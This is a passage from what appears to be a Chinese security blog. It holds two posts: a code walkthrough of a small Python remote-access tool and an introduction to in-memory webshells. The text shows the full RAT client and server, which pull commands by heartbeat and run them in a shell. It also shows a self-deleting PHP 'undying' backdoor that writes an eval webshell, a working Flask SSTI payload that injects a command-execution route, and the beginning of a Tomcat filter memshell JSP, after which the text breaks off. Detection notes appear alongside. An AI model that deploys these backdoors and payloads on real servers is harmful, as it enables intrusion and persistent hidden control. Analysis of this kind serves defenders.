<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] start client&quot;</span>)</span><br><span class="line">    client = Client()</span><br><span class="line">    client.run()</span><br></pre></td></tr></table></figure>

<p>新建了一个类Client，使用了run方法，跟踪一下看看。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Client</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.server_ip = <span class="string">&quot;192.168.100.1&quot;</span></span><br><span class="line">        self.server_port = <span class="string">&quot;5050&quot;</span></span><br><span class="line">        self.base_url = <span class="string">&quot;http://&quot;</span>+self.server_ip+<span class="string">&quot;:&quot;</span>+self.server_port</span><br><span class="line">        self.token = <span class="string">&quot;bkq98&quot;</span></span><br><span class="line">        self.init_name()</span><br><span class="line">        self.sleep_time = <span class="number">3</span></span><br><span class="line">        self.cmd_id = <span class="literal">None</span></span><br><span class="line">        self.result = <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>首先定义了类的一些基本的参数，比如服务端ip端口等。</p>
<p>随后便是run()</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="comment"># 心跳</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        self.heartbeat()</span><br><span class="line">        time.sleep(self.sleep_time)</span><br></pre></td></tr></table></figure>

<p>会不断的调用heartbeat()并且沉睡一段时间</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">heartbeat</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="comment"># 有上次的执行结果就上传 没有就心跳 </span></span><br><span class="line">    <span class="comment"># server返回有命令且不是上一次的命令则 执行命令存储结果等待下一次心跳上传执行结果</span></span><br><span class="line">    url = self.base_url+<span class="string">&quot;/heartbeat/&quot;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;token&quot;</span>: self.token,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: self.name,</span><br><span class="line">        <span class="string">&quot;result&quot;</span>: self.result,</span><br><span class="line">        <span class="string">&quot;cmd_id&quot;</span>: self.cmd_id</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> self.result !=<span class="string">&quot;&quot;</span>:</span><br><span class="line">        data[<span class="string">&quot;result&quot;</span>] = self.result</span><br><span class="line">        self.result = <span class="string">&quot;&quot;</span></span><br><span class="line">        </span><br><span class="line">    response = self.send_data(url, data)</span><br><span class="line">    <span class="keyword">if</span> response==<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># 有命令需要执行并返回</span></span><br><span class="line">    <span class="keyword">if</span> response.status_code==<span class="number">200</span>:</span><br><span class="line">        server_data = json.loads(response.content)</span><br><span class="line">        cmd = server_data.get(<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        cmd_id = server_data.get(<span class="string">&quot;cmd_id&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> cmd_id == self.cmd_id:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> cmd:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] cmd: &quot;</span>+cmd)</span><br><span class="line">            self.result = <span class="built_in">str</span>(self.<span class="built_in">exec</span>(cmd))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] result: &quot;</span>+self.result)</span><br><span class="line">            self.cmd_id = cmd_id</span><br></pre></td></tr></table></figure>

<p>首先是判断结果是否为空，如果为空则不作操作。</p>
<p>然后调用<code>send_data()</code>发送心跳包</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_data</span>(<span class="params">self, url, data</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url,json=data, timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] &quot;</span>+e)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure>

<p>将定义好的data发送出去，并返回一个response。</p>
<p>按照作者给的注释，如果返回状态值为200并且没有报错，则是需要返回执行的命令的结果。</p>
<p>随后接受，服务端传过来的两个参数，cmd和cmd_id，验证cmd_id是否是自己的id，如果是的话则直接结束。</p>
<p>然后调用<code>self.exec()</code>来执行命令，我们下面看看</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec</span>(<span class="params">self, cmd</span>):</span></span><br><span class="line">    <span class="keyword">if</span> cmd.startswith(<span class="string">&quot;sleep&quot;</span>):</span><br><span class="line">        self.sleep_time = <span class="built_in">int</span>(cmd.split(<span class="string">&quot; &quot;</span>)[-<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;time set ok&quot;</span></span><br><span class="line">    <span class="keyword">if</span> cmd.startswith(<span class="string">&quot;msf&quot;</span>):</span><br><span class="line">        <span class="comment">#TODO</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;msf set ok&quot;</span></span><br><span class="line">    <span class="keyword">return</span> run_cmd(cmd)</span><br></pre></td></tr></table></figure>

<p>可以看出这里是一个功能检测，方便我们后期拓展。输入关键词就可以执行响应的操作，如果是sleep。则将自己的心跳时间修改为cmd最后一个参数。如果是msf，就写入联动msf的代码就好了，这里作者还没做好。</p>
<p>如果是正常的执行命令则，调用run_cmd函数。这里我们跟如run_cmd函数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_cmd</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    p = subprocess.Popen(cmd, stderr=subprocess.STDOUT, stdout=subprocess.PIPE, shell=<span class="literal">True</span>, close_fds=<span class="literal">True</span>,</span><br><span class="line">                         start_new_session=<span class="literal">True</span>)</span><br><span class="line">    formats = <span class="string">&#x27;gbk&#x27;</span> <span class="keyword">if</span> platform.system() == <span class="string">&quot;Windows&quot;</span> <span class="keyword">else</span> <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = p.stdout.read()</span><br><span class="line">        p.wait()</span><br><span class="line">        <span class="keyword">return</span> result.decode(formats)</span><br><span class="line">    <span class="keyword">except</span> :</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;命令执行错误&quot;</span></span><br></pre></td></tr></table></figure>

<p>这里改成了一个子线程，根据系统来进行返回值的编码，然后执行第一个cmd，由于设置了shell=True,那我们的命令是可以带空格执行的。</p>
<p>随后就是return命令执行结果，并且wait线程。</p>
<p>接着看上面heartbeat()最后一步</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> cmd:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] cmd: &quot;</span>+cmd)</span><br><span class="line">                self.result = <span class="built_in">str</span>(self.<span class="built_in">exec</span>(cmd))</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[*] result: &quot;</span>+self.result)</span><br><span class="line">                self.cmd_id = cmd_id</span><br></pre></td></tr></table></figure>

<p>将self.result赋值成结果然后self.cmd_id赋值成cmd_id，这个cmd_id就是心跳检测的关键，在sleep了设定的数值之后，如果cmd_id，那么就不会返回新的结果，除非有新的cmd_id出现，否则不会执行任何命令。</p>
<p>随后执行完命令之后继续沉睡指定时间，然后继续while循环</p>
<p>最后就是有一个检测，如果用户输入ctrl+c,那么就会停止这个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ctrl_c</span>(<span class="params">signum,frame</span>):</span></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] input ctrl c&quot;</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">signal.signal(signal.SIGINT, ctrl_c)</span><br></pre></td></tr></table></figure>

<h1 id="web端（控制端）"><a href="#web端（控制端）" class="headerlink" title="web端（控制端）"></a>web端（控制端）</h1><p>简单看了下，基于flask框架开发的。</p>
<p><img src="/2022/11/13/%E5%88%86%E6%9E%90%E4%B8%80%E6%AC%BE%E4%BB%85%E8%83%BD%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84python%E8%BF%9C%E6%8E%A7/image-20221113145948432.png" alt="image-20221113145948432"></p>
<p>主代码:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> app</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;192.168.100.1&quot;</span>, <span class="number">5050</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>定义你的服务器ip和访问的端口，不过这个没有密码，后续要使用的话，可以加入一些响应的鉴权措施。</p>
<p>router.py路由：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    client_list = Clients.query.order_by(Clients.update_time).<span class="built_in">all</span>()</span><br><span class="line">    <span class="keyword">return</span> render_template(</span><br><span class="line">        <span class="string">&quot;index.html&quot;</span>, clients = client_list)</span><br></pre></td></tr></table></figure>

<p>做了个跳转，跳转到index.html页面</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/heartbeat/&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">heartbeat</span>():</span></span><br><span class="line">    data = request.get_json()</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    token = data.get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> token !=<span class="string">&quot;bkq98&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;&#125;)</span><br><span class="line">    <span class="comment"># 先判断是否需要注册client</span></span><br><span class="line">    name = data.get(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    client_result = data.get(<span class="string">&quot;result&quot;</span>)</span><br><span class="line">    client_cmd_id = data.get(<span class="string">&quot;cmd_id&quot;</span>)</span><br><span class="line">    db_client = Clients.query.<span class="built_in">filter</span>(Clients.name==name, Clients.ip==ip).first()</span><br><span class="line">    <span class="keyword">if</span> db_client:</span><br><span class="line">        db_client.update_time = datetime.datetime.now()</span><br><span class="line">        db.session.commit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        client = Clients()</span><br><span class="line">        client.name = name</span><br><span class="line">        client.ip = ip</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            db.session.add(client)</span><br><span class="line">            db.session.commit()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="keyword">if</span> client_result:</span><br><span class="line">        <span class="comment"># 上次结果</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] client: &quot;</span>+name+<span class="string">&quot; ip: &quot;</span>+ip+<span class="string">&quot; upload result: &quot;</span>+ client_result)</span><br><span class="line">        db_echo_result = EchoResult.query.<span class="built_in">filter</span>(EchoResult.<span class="built_in">id</span>==client_cmd_id).first()</span><br><span class="line">        db_echo_result.result = client_result</span><br><span class="line">        db.session.commit()</span><br><span class="line">    <span class="comment"># 获取是否有需要执行的命令</span></span><br><span class="line">    db_echo_result = EchoResult.query.<span class="built_in">filter</span>(EchoResult.client_name==name,EchoResult.ip==ip,EchoResult.result==<span class="literal">None</span>).first()</span><br><span class="line">    <span class="keyword">if</span> db_echo_result:</span><br><span class="line">        cmd_id = db_echo_result.<span class="built_in">id</span></span><br><span class="line">        cmd = db_echo_result.cmd</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] server issued cmd:&quot;</span>+cmd+<span class="string">&quot; name: &quot;</span> +name+<span class="string">&quot; ip: &quot;</span>+ip)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;cmd_id&quot;</span>:cmd_id, <span class="string">&quot;cmd&quot;</span>:cmd&#125;)</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;&#125;)</span><br></pre></td></tr></table></figure>

<p>这个路由就是client端心跳包请求的地址</p>
<p>首先会将心跳包传的参数存储到data变量中，随后会校检一下其中的token是否是我们设置的token，</p>
<p>随后就是一系列的提取数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = data.get(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">ip = request.remote_addr</span><br><span class="line">client_result = data.get(<span class="string">&quot;result&quot;</span>)</span><br><span class="line">client_cmd_id = data.get(<span class="string">&quot;cmd_id&quot;</span>)</span><br><span class="line">db_client = Clients.query.<span class="built_in">filter</span>(Clients.name==name, Clients.ip==ip).first()</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> db_client:</span><br><span class="line">    db_client.update_time = datetime.datetime.now()</span><br><span class="line">    db.session.commit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    client = Clients()</span><br><span class="line">    client.name = name</span><br><span class="line">    client.ip = ip</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        db.session.add(client)</span><br><span class="line">        db.session.commit()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure>

<p>然后就是检测是否是数据库中已有的用户，如果是的话，就更新数据库的时间，如果不是，就添加一个用户。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> client_result:</span><br><span class="line">    <span class="comment"># 上次结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] client: &quot;</span>+name+<span class="string">&quot; ip: &quot;</span>+ip+<span class="string">&quot; upload result: &quot;</span>+ client_result)</span><br><span class="line">    db_echo_result = EchoResult.query.<span class="built_in">filter</span>(EchoResult.<span class="built_in">id</span>==client_cmd_id).first()</span><br><span class="line">    db_echo_result.result = client_result</span><br><span class="line">    db.session.commit()</span><br><span class="line"><span class="comment"># 获取是否有需要执行的命令</span></span><br><span class="line">db_echo_result = EchoResult.query.<span class="built_in">filter</span>(EchoResult.client_name==name,EchoResult.ip==ip,EchoResult.result==<span class="literal">None</span>).first()</span><br><span class="line"><span class="keyword">if</span> db_echo_result:</span><br><span class="line">    cmd_id = db_echo_result.<span class="built_in">id</span></span><br><span class="line">    cmd = db_echo_result.cmd</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] server issued cmd:&quot;</span>+cmd+<span class="string">&quot; name: &quot;</span> +name+<span class="string">&quot; ip: &quot;</span>+ip)</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;cmd_id&quot;</span>:cmd_id, <span class="string">&quot;cmd&quot;</span>:cmd&#125;)</span><br><span class="line"><span class="keyword">return</span> jsonify(&#123;&#125;)</span><br></pre></td></tr></table></figure>

<p>这里就是首先获取了上次的结果，检测result参数是否是none，如果是的话，就是需要执行的新命令，返回过去并且等待下一次获取。</p>
<p>其他的路由没有什么讲的，就是几个显示页面，显示一些信息。</p>
<p>在<code>__int__.py</code>文件中定义了数据库文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">base_dir = os.path.abspath(os.path.dirname(__file__))</span><br><span class="line">app.config[<span class="string">&quot;SQLALCHEMY_DATABASE_URI&quot;</span>] = <span class="string">&#x27;sqlite:///&#x27;</span> + os.path.join(base_dir, <span class="string">&quot;../&quot;</span>, <span class="string">&#x27;miansha3.db&#x27;</span>)</span><br><span class="line">app.config[<span class="string">&quot;SQLALCHEMY_COMMIT_ON_TEARDOWN&quot;</span>] = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">db = SQLAlchemy(app)</span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> router</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> app.app_context(): </span><br><span class="line">    db.init_app(app)</span><br><span class="line">    db.create_all()</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>其实也比较简单，这款远控，毕竟只有执行命令的功能</p>
<p>开发的大概思路就是被控端会定时发起心跳包到服务端，服务端接受心跳包中上一次执行命令的结果，并且返回新的命令。</p>
]]></content>
      <categories>
        <category>-python</category>
      </categories>
  </entry>
  <entry>
    <title>初探内存马</title>
    <url>/2022/12/25/%E5%88%9D%E6%8E%A2%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[<h1 id="初探内存马"><a href="#初探内存马" class="headerlink" title="初探内存马"></a>初探内存马</h1><p>通过此文理解内存马，掌握内存马的基本原理以及一些基本分类，和一些基础知识，有助于后面我们的各种技术研究。</p>
<p> 内存webshell相比于常规webshell更容易躲避传统安全监测设备的检测，通常被用来做持久化，规避检测，持续驻留目标服务器，不容易清除。无文件攻击、内存Webshell、进程注入等基于内存的攻击手段也受到了大多数攻击者青睐。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">大概原理：</span><br><span class="line">是先由客户端发起一个web请求，中间件的各个独立的组件如Listener、Filter、Servlet等组件会在请求过程中做监听、判断、过滤等操作，内存马利用请求过程在内存中修改已有的组件或者动态注册一个新的组件，插入恶意的shellcode达到持久化的控制服务器。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/12/25/%E5%88%9D%E6%8E%A2%E5%86%85%E5%AD%98%E9%A9%AC/1662006657_63103581f3f1446ecb7e9.png" alt="img"></p>
<p>以上是内存马的相关分类</p>
<p>下面基本介绍一下各种内存马。</p>
<h1 id="各种内存马"><a href="#各种内存马" class="headerlink" title="各种内存马"></a>各种内存马</h1><h2 id="php内存马"><a href="#php内存马" class="headerlink" title="php内存马"></a>php内存马</h2><p>php内存马也就是php不死马是将不死马启动后删除本身，在内存中执行死循环，使管理员无法删除木马文件。本次演示是将php不死马放到web目录下访问后及执行会在本地循环生成php一句话木马。</p>
<p><strong>检测思路</strong></p>
<p>1.检查所有php进程处理请求的持续时间</p>
<p>2.检测执行文件是否在文件系统真实存在</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//set_time_limit()函数：设置允许脚本运行的时间，单位为秒。如果设置为0（零），没有时间方面的限制。</span></span><br><span class="line">ignore_user_abort(<span class="number">1</span>);</span><br><span class="line"><span class="comment">//ignore_user_abort()函数：函数设置与客户机断开是否会终止脚本的执行，如果设置为 true，则忽略与用户的断开。</span></span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//unlink(__FILE__)函数：删除文件。</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = ‘<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;zzz&quot;</span>]) <span class="meta">?&gt;</span>’;</span><br><span class="line"></span><br><span class="line">file_put_contents(<span class="string">&quot;22.php&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="comment">//file_put_contents函数：将一个字符串写入文件。</span></span><br><span class="line">usleep(<span class="number">10000</span>);</span><br><span class="line"><span class="comment">//usleep函数：延迟执行当前脚本若干微秒（一微秒等于一百万分之一秒）。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//看看最基础的代码嗯就是不断的将一句话木马传入22.php文件中去。</span></span><br></pre></td></tr></table></figure>

<p><strong>如何处置</strong></p>
<p>对于不死马，直接删除脚本是没有用的，因为php执行的时候已经把脚本读进去解释成opcode运行了。</p>
<p>其实也简单，可以写一个条件竞争的文件来克制不死马，其中必须将usleep改为小雨php不死马的参数。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">ignore_user_abort(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = ‘<span class="number">2222</span>’;</span><br><span class="line"></span><br><span class="line">file_put_contents(<span class="string">&quot;22.php&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">usleep(<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="python内存马"><a href="#python内存马" class="headerlink" title="python内存马"></a>python内存马</h2><p>Python内存马利用flask框架中ssti注入来实现，flask框架中在web应用模板渲染的过程中用到render_template_string()进行渲染但未对用户传输的代码进行过滤导致用户可以通过注入恶意代码来实现python内存马的注入。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#代码实例</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,url_for,redirect,render_template,render_template_string,request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/index/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    content = request.args.get(<span class="string">&quot;content&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5000/index?=content%7B%7Ba.__init__.__globals__%5B%27__builtins__%27%5D%5B%27eval%27%5D(%22app.add_url_rule(%27/shell1%27,%20%27shell%27,%20lambda%20:__import__(%27os%27).popen(_request_ctx_stack.top.request.args.get(%27cmd%27,%20%27whoami%27)).read())%22,%7B%27_request_ctx_stack%27:url_for.__globals__%5B%27_request_ctx_stack%27%5D,%27app%27:url_for.__globals__%5B%27current_app%27%5D%7D)%7D%7D</span><br></pre></td></tr></table></figure>

<p>这就是payload，解一下url编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5000/index?=content&#123;&#123;a.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell1&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>手续看是写入了一个shell1的路由，一旦访问这个路由就会执行whoami命令。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__class__:返回调用的参数类型</span><br><span class="line"></span><br><span class="line">__bases__:返回基类列表</span><br><span class="line"></span><br><span class="line">__builtins__:内建模块的引用，在任何地方都是可见的(包括全局)，每个 Python 脚本都会自动加载，这个模块包括了很多强大的 built-in 函数，例如eval, exec, open等</span><br><span class="line"></span><br><span class="line">__globals__：以字典的形式返回函数所在的全局命名空间所定义的全局变量,这里的函数可以是类class的构造函数如__init__,也可以是flask的函数如url_for等。</span><br><span class="line"></span><br><span class="line">add_url_rule注册了一个/shell的路由，__init__相当于构造函数，定义自己的属性，通过__init__.__globals__得到他们的命名空间从而得到builtins就可以执行内置函数如eval, exec, open等。</span><br></pre></td></tr></table></figure>

<p><strong>检测思路</strong></p>
<p>1.查看所有内建模块中是否包含eval、exec等可以执行代码的函数如：class ‘warnings.catch_warnings’、class ‘site.Quitter’等。</p>
<p>2.检测self.add_url_rule()中特殊名字的路由如shell等。</p>
<h2 id="java内存马"><a href="#java内存马" class="headerlink" title="java内存马"></a>java内存马</h2><p>在内存马家族中，最多也最常见的就是java类别的，后续我会补充各种类型的内存马，通过代码，流量，逐步进行分析。</p>
<p><strong>fillter型内存马</strong><br> Filter：FIlter为过滤器可以对用户的一些请求进行拦截修改等操作。当web.xml中注册了一个Filter来对某个 Servlet 程序进行拦截处理时该 Filter 可以对Servlet 容器发送给 Servlet 程序的请求和 Servlet 程序回送给 Servlet 容器的响应进行拦截，可以决定是否将请求继续传递给 Servlet 程序，以及对请求和相应信息进行修改。filter型内存马是将命令执行的文件通过动态注册成一个恶意的filter，这个filter没有落地文件并可以让客户端发来的请求通过它来做命令执行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filter检测思路：</span><br><span class="line"></span><br><span class="line">带有特殊含义的filter的名字比如shell等。</span><br><span class="line"></span><br><span class="line">Filter的优先级，filter内存马需要将filter调至最高</span><br><span class="line"></span><br><span class="line">查看web.xml中有没有filter配置</span><br><span class="line"></span><br><span class="line">检测特殊的classloader</span><br><span class="line"></span><br><span class="line">检测classloader路径下没有class文件</span><br><span class="line"></span><br><span class="line">检测Filter中的doFilter方法是否有恶意代码</span><br></pre></td></tr></table></figure>

<p>filter内存马实战：</p>
<p> 这里我们将公开的filter类型的内存马文件直接上传到tomcat网站下，访问内存马后就植入成功了，植入成功后在删掉相对的jsp文件也不会影响内存马的运行，但是重启tomcat服务器后内存马即失效。注入成功后在路径后加入?cmd=后跟命令即可。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;!-- tomcat <span class="number">8</span>/<span class="number">9</span> --&gt;</span><br><span class="line">&lt;!-- page <span class="keyword">import</span> = <span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span></span><br><span class="line">page <span class="keyword">import</span> = <span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> --&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;!-- tomcat <span class="number">7</span> --&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;org.apache.catalina.deploy.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;org.apache.catalina.deploy.FilterDef&quot;</span> %&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filterDemo</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span 